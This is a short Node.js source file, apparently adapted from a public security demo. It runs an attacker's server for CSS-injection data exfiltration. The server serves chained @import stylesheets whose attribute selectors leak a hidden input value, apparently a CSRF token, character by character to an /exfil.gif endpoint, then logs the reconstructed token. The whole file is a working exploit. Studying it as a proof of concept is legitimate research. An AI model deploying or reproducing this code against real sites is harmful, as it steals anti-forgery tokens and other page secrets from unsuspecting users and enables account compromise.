/**
 * Adapted from Pepe Vila's demo
 * https://gist.github.com/cgvwzq/6260f0f0a47c009c87b4d46ce3808231
 **/
const http = require("http");
const PORT = 3030;
const BASE64_CHARS = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='.split('');

const sessions = {};

const requestHandler = (request, response) => {
  const req = new URL('http://a' + request.url);
  const [id, token] = req.search.slice(1).split('-');
  switch (req.pathname) {
    case '/injected.css':
      if (id) {
        sessions[id].pending.push(response);
      } else {
        sendStylesheet(response, createSession());
      }
      return;
    case '/exfil.gif':
      response.end();
      console.log('Partial token for session %s: %s', id, token);
      sendStylesheet(sessions[id].pending.shift(), id, token);
      return;
    case '/csrf.svg':
      console.log('Complete token for session %s: %s', id, token);
      sessions[id].pending.forEach(res => res.end());
      delete sessions[id];
      sendResponse(response,
        `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 ${token.length * 16} 16" width="${token.length * 16}" height="16"><text y="12">${token}</text></svg>`,
        'image/svg+xml');
      return;
  }
  sendResponse(response, 'You\'re not supposed to get this...', 'text/plain', 404);
};


const sendStylesheet = (response, id, token = '') => {
  const css = `@import url(/injected.css?${id}-${token});
${BASE64_CHARS.map(ch =>
  `input[value^="${token}${ch}"] + * { --b${token.length}: url(/exfil.gif?${id}-${token}${ch}); }`
).join('\n')}
input${'[value]'.repeat(token.length + 1)} + * { background: var(--b${token.length}); }
input[value="${token}"] ~ .result { background-image: url(/csrf.svg?${id}-${token}); };`;
  sendResponse(response, css);
};

const createSession = () => {
  const id = Math.floor(Math.random() * 36 ** 6).toString(36);
  sessions[id] = { pending: [] };
  return id;
};

const sendResponse = (res, content, type = 'text/css', status = 200) => {
  res.writeHead(status, {
    'Content-Type': type,
    'Content-Length': content.length
  });
  res.end(content);
};

const server = http.createServer(requestHandler);

server.listen(PORT, (err) => {
  console.log('CSS Exfiltration test');
  if (err) {
    console.log('- Error while starting up', err);
  } else {
    console.log('- Listening on port %d', PORT);
  }
});
